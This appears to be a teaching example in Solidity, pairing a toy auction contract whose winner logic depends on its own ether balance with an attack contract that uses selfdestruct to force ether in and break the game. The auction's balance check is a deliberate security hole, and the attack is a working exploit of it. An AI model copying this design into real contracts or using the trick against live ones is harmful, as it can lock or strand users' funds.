contract INukeAuction 
{
    uint public maxAmount = 10 ether;
    address public winner;

    function deposit() public payable 
    {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= maxAmount, "Auction is over");

        if (balance == maxAmount) 
        {
            winner = msg.sender;
        }
    }

    function claimAuction() public 
    {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }

    function isAuctionSane() external view returns (bool)
    {
        return (address(this).balance < 10 ether);
    }

    function getBalance() public view returns (uint) 
    {
        return address(this).balance;
    }
}

contract Attack2 
{
    INukeAuction auction;

    constructor(INukeAuction _auction) 
    {
        auction = INukeAuction(_auction);
    }

    function attack() public payable 
    {
        // You can simply break the game by sending ether so that
        // the game balance >= 10 ether

        // cast address to payable
        address payable addr = payable(address(auction));
        selfdestruct(addr);
    }
}